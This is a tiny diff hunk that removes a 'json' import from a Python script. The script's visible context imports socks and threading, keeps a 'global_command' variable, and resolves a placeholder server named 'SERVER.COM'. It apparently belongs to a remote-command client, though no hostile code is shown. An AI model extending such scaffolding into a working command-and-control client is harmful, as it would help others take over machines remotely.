@@ -5,7 +5,6 @@ import random
 import threading
 import socks
 import sys
-import json
 
 global_command = ''
 server = socket.gethostbyname('SERVER.COM')
